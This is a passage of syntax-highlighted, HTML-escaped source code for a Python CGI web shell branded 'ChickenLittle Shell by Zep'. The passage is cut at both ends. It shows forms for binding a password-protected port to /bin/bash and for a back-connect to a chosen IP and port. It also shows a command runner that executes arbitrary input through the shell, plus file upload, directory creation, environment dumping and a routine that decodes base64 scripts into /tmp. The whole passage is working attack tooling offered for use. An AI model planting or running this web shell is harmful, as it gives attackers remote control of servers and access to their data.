&lt;span class="s2"&gt;    &amp;lt;p /&amp;gt;&lt;/span&gt;
&lt;span class="s2"&gt;    &amp;lt;table width=&amp;quot;100%&amp;quot;&amp;gt;&lt;/span&gt;
&lt;span class="s2"&gt;        &amp;lt;tr&amp;gt;&lt;/span&gt;
&lt;span class="s2"&gt;            &amp;lt;td style=&amp;quot;text-align:center&amp;quot; width=&amp;quot;50%&amp;quot;&amp;gt;&lt;/span&gt;
&lt;span class="s2"&gt;                &amp;lt;b&amp;gt;:: Bind port to /bin/bash ::&amp;lt;/b&amp;gt;&amp;lt;br /&amp;gt;&lt;/span&gt;
&lt;span class="s2"&gt;                &amp;lt;form action=&amp;quot;?&amp;quot; method=&amp;quot;POST&amp;quot;&amp;gt;&lt;/span&gt;
&lt;span class="s2"&gt;                    &amp;lt;table width=&amp;quot;100%&amp;quot;&amp;gt;&lt;/span&gt;
&lt;span class="s2"&gt;                        &amp;lt;tr&amp;gt;&lt;/span&gt;
&lt;span class="s2"&gt;                            &amp;lt;td width=&amp;quot;50%&amp;quot; style=&amp;quot;border:none;text-align:right&amp;quot;&amp;gt;Port: &amp;lt;/td&amp;gt;&lt;/span&gt;
&lt;span class="s2"&gt;                            &amp;lt;td style=&amp;quot;border:none&amp;quot;&amp;gt;&amp;lt;input type=&amp;quot;text&amp;quot; value=&amp;quot;&amp;quot; size=&amp;quot;10&amp;quot; name=&amp;quot;port&amp;quot; /&amp;gt;&amp;lt;/td&amp;gt;&lt;/span&gt;
&lt;span class="s2"&gt;                        &amp;lt;/tr&amp;gt;&lt;/span&gt;
&lt;span class="s2"&gt;                        &amp;lt;tr&amp;gt;&lt;/span&gt;
&lt;span class="s2"&gt;                            &amp;lt;td style=&amp;quot;border:none;text-align:right&amp;quot;&amp;gt;Password: &amp;lt;/td&amp;gt;&lt;/span&gt;
&lt;span class="s2"&gt;                            &amp;lt;td style=&amp;quot;border:none&amp;quot;&amp;gt;&amp;lt;input type=&amp;quot;text&amp;quot; value=&amp;quot;&amp;quot; size=&amp;quot;10&amp;quot; name=&amp;quot;password&amp;quot; /&amp;gt;&amp;lt;/td&amp;gt;&lt;/span&gt;
&lt;span class="s2"&gt;                        &amp;lt;/tr&amp;gt;&lt;/span&gt;
&lt;span class="s2"&gt;                    &amp;lt;/table&amp;gt;&lt;/span&gt;
&lt;span class="s2"&gt;                    &amp;lt;input type=&amp;quot;submit&amp;quot; value=&amp;quot;Bind&amp;quot;&amp;gt;&lt;/span&gt;
&lt;span class="s2"&gt;                    &amp;lt;input type=&amp;quot;hidden&amp;quot; value=&amp;quot;bind_port&amp;quot; size=&amp;quot;50&amp;quot; name=&amp;quot;command&amp;quot; /&amp;gt;&lt;/span&gt;
&lt;span class="s2"&gt;                    &amp;lt;input type=&amp;quot;hidden&amp;quot; value=&amp;quot;$cur_dir&amp;quot; size=&amp;quot;50&amp;quot; name=&amp;quot;cur_dir&amp;quot;&amp;gt;&lt;/span&gt;
&lt;span class="s2"&gt;                &amp;lt;/form&amp;gt;&lt;/span&gt;
&lt;span class="s2"&gt;            &amp;lt;/td&amp;gt;&lt;/span&gt;
&lt;span class="s2"&gt;            &amp;lt;td style=&amp;quot;text-align:center&amp;quot; width=&amp;quot;50%&amp;quot;&amp;gt;&lt;/span&gt;
&lt;span class="s2"&gt;                &amp;lt;b&amp;gt;:: back-connect ::&amp;lt;/b&amp;gt;&amp;lt;br /&amp;gt;&lt;/span&gt;
&lt;span class="s2"&gt;                &amp;lt;form action=&amp;quot;?&amp;quot; method=&amp;quot;POST&amp;quot;&amp;gt;&lt;/span&gt;
&lt;span class="s2"&gt;                    &amp;lt;table width=&amp;quot;100%&amp;quot;&amp;gt;&lt;/span&gt;
&lt;span class="s2"&gt;                        &amp;lt;tr&amp;gt;&lt;/span&gt;
&lt;span class="s2"&gt;                            &amp;lt;td width=&amp;quot;50%&amp;quot; style=&amp;quot;border:none;text-align:right&amp;quot;&amp;gt;IP: &amp;lt;/td&amp;gt;&lt;/span&gt;
&lt;span class="s2"&gt;                            &amp;lt;td style=&amp;quot;border:none&amp;quot;&amp;gt;&amp;lt;input type=&amp;quot;text&amp;quot; value=&amp;quot;&amp;quot; size=&amp;quot;10&amp;quot; name=&amp;quot;ip&amp;quot; /&amp;gt;&amp;lt;/td&amp;gt;&lt;/span&gt;
&lt;span class="s2"&gt;                        &amp;lt;/tr&amp;gt;&lt;/span&gt;
&lt;span class="s2"&gt;                        &amp;lt;tr&amp;gt;&lt;/span&gt;
&lt;span class="s2"&gt;                            &amp;lt;td style=&amp;quot;border:none;text-align:right&amp;quot;&amp;gt;Port: &amp;lt;/td&amp;gt;&lt;/span&gt;
&lt;span class="s2"&gt;                            &amp;lt;td style=&amp;quot;border:none&amp;quot;&amp;gt;&amp;lt;input type=&amp;quot;text&amp;quot; value=&amp;quot;&amp;quot; size=&amp;quot;10&amp;quot; name=&amp;quot;port&amp;quot; /&amp;gt;&amp;lt;/td&amp;gt;&lt;/span&gt;
&lt;span class="s2"&gt;                        &amp;lt;/tr&amp;gt;&lt;/span&gt;
&lt;span class="s2"&gt;                    &amp;lt;/table&amp;gt;&lt;/span&gt;
&lt;span class="s2"&gt;                    &amp;lt;input type=&amp;quot;submit&amp;quot; value=&amp;quot;Connect&amp;quot;&amp;gt;&lt;/span&gt;
&lt;span class="s2"&gt;                    &amp;lt;input type=&amp;quot;hidden&amp;quot; value=&amp;quot;back_connect&amp;quot; size=&amp;quot;50&amp;quot; name=&amp;quot;command&amp;quot; /&amp;gt;&lt;/span&gt;
&lt;span class="s2"&gt;                    &amp;lt;input type=&amp;quot;hidden&amp;quot; value=&amp;quot;$cur_dir&amp;quot; size=&amp;quot;50&amp;quot; name=&amp;quot;cur_dir&amp;quot;&amp;gt;&lt;/span&gt;
&lt;span class="s2"&gt;                &amp;lt;/form&amp;gt;&lt;/span&gt;
&lt;span class="s2"&gt;            &amp;lt;/td&amp;gt;&lt;/span&gt;
&lt;span class="s2"&gt;        &amp;lt;/tr&amp;gt;&lt;/span&gt;
&lt;span class="s2"&gt;    &amp;lt;/table&amp;gt;&lt;/span&gt;
&lt;span class="s2"&gt;    &amp;lt;p /&amp;gt;&lt;/span&gt;
&lt;span class="s2"&gt;    &amp;lt;table width=&amp;quot;100%&amp;quot;&amp;gt;&lt;/span&gt;
&lt;span class="s2"&gt;        &amp;lt;tr&amp;gt;&lt;/span&gt;
&lt;span class="s2"&gt;            &amp;lt;td style=&amp;quot;text-align:center&amp;quot;&amp;gt;&amp;lt;b&amp;gt;(.)(.) [ChickenLittle Shell by Zep] (.)(.)&amp;lt;/b&amp;gt;&amp;lt;/td&amp;gt;&lt;/span&gt;
&lt;span class="s2"&gt;        &amp;lt;/tr&amp;gt;&lt;/span&gt;
&lt;span class="s2"&gt;    &amp;lt;/table&amp;gt;&lt;/span&gt;
&lt;span class="s2"&gt;&amp;lt;/body&amp;gt;&lt;/span&gt;
&lt;span class="s2"&gt;&amp;lt;/html&amp;gt;&lt;/span&gt;
&lt;span class="s2"&gt;&amp;quot;&amp;quot;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;

&lt;span class="n"&gt;scriptname&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;&amp;quot;&lt;/span&gt;

&lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;os&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;environ&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;has_key&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;SCRIPT_NAME&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
    &lt;span class="n"&gt;scriptname&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;os&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;environ&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;SCRIPT_NAME&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;

&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;get_environ_table&lt;/span&gt;&lt;span class="p"&gt;():&lt;/span&gt;
    &lt;span class="n"&gt;s&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;&amp;lt;table style=&lt;/span&gt;&lt;span class="se"&gt;\&amp;quot;&lt;/span&gt;&lt;span class="s2"&gt;display:none&lt;/span&gt;&lt;span class="se"&gt;\&amp;quot;&lt;/span&gt;&lt;span class="s2"&gt; id=&lt;/span&gt;&lt;span class="se"&gt;\&amp;quot;&lt;/span&gt;&lt;span class="s2"&gt;environ_table&lt;/span&gt;&lt;span class="se"&gt;\&amp;quot;&lt;/span&gt;&lt;span class="s2"&gt;&amp;gt;&amp;quot;&lt;/span&gt;
    &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;k&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="n"&gt;os&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;environ&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
        &lt;span class="n"&gt;s&lt;/span&gt;&lt;span class="o"&gt;+=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&amp;lt;tr&amp;gt;&amp;lt;td&amp;gt;&lt;/span&gt;&lt;span class="si"&gt;%s&lt;/span&gt;&lt;span class="s2"&gt;&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt;&lt;/span&gt;&lt;span class="si"&gt;%s&lt;/span&gt;&lt;span class="s2"&gt;&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;%&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;k&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="n"&gt;os&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;environ&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;k&lt;/span&gt;&lt;span class="p"&gt;])&lt;/span&gt;
    &lt;span class="n"&gt;s&lt;/span&gt;&lt;span class="o"&gt;+=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&amp;lt;/table&amp;gt;&amp;quot;&lt;/span&gt;
    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;s&lt;/span&gt;

&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;run_command&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;command&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
    &lt;span class="n"&gt;p&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;subprocess&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Popen&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;command&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;shell&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="bp"&gt;True&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;stdin&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;subprocess&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;PIPE&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;stdout&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;subprocess&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;PIPE&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;stderr&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;subprocess&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;STDOUT&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;close_fds&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="bp"&gt;True&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="n"&gt;o&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;p&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;stdin&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="n"&gt;p&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;stdout&lt;/span&gt;
    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;o&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;read&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;

&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;get_param&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;form&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;param&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="n"&gt;default&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="bp"&gt;None&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
    &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;form&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;has_key&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;param&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
        &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;form&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;getvalue&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;param&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;default&lt;/span&gt;

&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;can_write&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;file_name&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
    &lt;span class="k"&gt;try&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
        &lt;span class="n"&gt;f&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;open&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;file_name&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;w&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
        &lt;span class="n"&gt;f&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;close&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
        &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="bp"&gt;True&lt;/span&gt;
    &lt;span class="k"&gt;except&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
        &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="bp"&gt;False&lt;/span&gt;

&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;put_script&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;base_name&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="n"&gt;encoded_script&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
    &lt;span class="n"&gt;script&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;base64&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;b64decode&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;encoded_script&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="n"&gt;i&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;
    &lt;span class="n"&gt;file_name&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;/tmp/&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="n"&gt;base_name&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="nb"&gt;str&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="k"&gt;while&lt;/span&gt; &lt;span class="ow"&gt;not&lt;/span&gt; &lt;span class="n"&gt;can_write&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;file_name&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
        &lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="o"&gt;+=&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;
        &lt;span class="n"&gt;file_name&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;/tmp/&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="n"&gt;base_name&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="nb"&gt;str&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;

    &lt;span class="n"&gt;f&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;open&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;file_name&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;w&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="n"&gt;f&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;write&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;script&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="n"&gt;f&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;close&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;file_name&lt;/span&gt;

&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;main&lt;/span&gt;&lt;span class="p"&gt;():&lt;/span&gt;

    &lt;span class="k"&gt;print&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;Content-type: text/html&amp;quot;&lt;/span&gt;         &lt;span class="c1"&gt;# header&lt;/span&gt;
    &lt;span class="k"&gt;print&lt;/span&gt;                                   &lt;span class="c1"&gt;# blank line&lt;/span&gt;

    &lt;span class="n"&gt;form&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;cgi&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;FieldStorage&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
    &lt;span class="n"&gt;uname&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;run_command&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;uname -a&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="n"&gt;uid&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;run_command&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;id&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;

    &lt;span class="n"&gt;cur_dir&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;get_param&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;form&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;cur_dir&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="n"&gt;os&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;getcwd&lt;/span&gt;&lt;span class="p"&gt;())&lt;/span&gt;

    &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="ow"&gt;not&lt;/span&gt; &lt;span class="n"&gt;os&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;path&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;exists&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;cur_dir&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
        &lt;span class="n"&gt;cur_dir&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;os&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;getcwd&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
    &lt;span class="n"&gt;os&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;chdir&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;cur_dir&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="n"&gt;command&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;get_param&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;form&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;command&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="n"&gt;command_result&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;&amp;quot;&lt;/span&gt;

    &lt;span class="n"&gt;file_content&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;&amp;quot;&lt;/span&gt;
    &lt;span class="n"&gt;file_name&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;&amp;quot;&lt;/span&gt;
    &lt;span class="n"&gt;edit_file_box_visibility&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;None&amp;quot;&lt;/span&gt;

    &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;command&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;mkdir&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
        &lt;span class="n"&gt;new_dir&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;get_param&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;form&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;new_dir&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
        &lt;span class="n"&gt;command_result&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;run_command&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;mkdir &amp;quot;&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;new_dir&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="k"&gt;elif&lt;/span&gt; &lt;span class="n"&gt;command&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;upload&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
        &lt;span class="n"&gt;upload_file&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;form&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;file&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
        &lt;span class="k"&gt;try&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
            &lt;span class="n"&gt;f&lt;/span&gt;  &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;open&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;upload_file&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;filename&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;w&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
            &lt;span class="k"&gt;while&lt;/span&gt; &lt;span class="bp"&gt;True&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
                &lt;span class="n"&gt;chunk&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;upload_file&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;file&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;read&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;1024&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
                &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="ow"&gt;not&lt;/span&gt; &lt;span class="n"&gt;chunk&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="k"&gt;break&lt;/span&gt;
                &lt;span class="n"&gt;f&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;write&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;chunk&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
            &lt;span class="n"&gt;f&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;close&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
        &lt;span class="k"&gt;except&lt;/span&gt; &lt;span class="ne"&gt;Exception&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="n"&gt;e&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
            &lt;span class="n"&gt;command_result&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;str&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;e&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;

    &lt;span class="k"&gt;elif&lt;/span&gt; &lt;span class="n"&gt;command&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;search_text&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
        &lt;span class="n"&gt;search_text&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;get_param&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;form&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;search_text&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
        &lt;span class="n"&gt;search_dir&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;get_param&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;form&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;search_dir&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;.&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
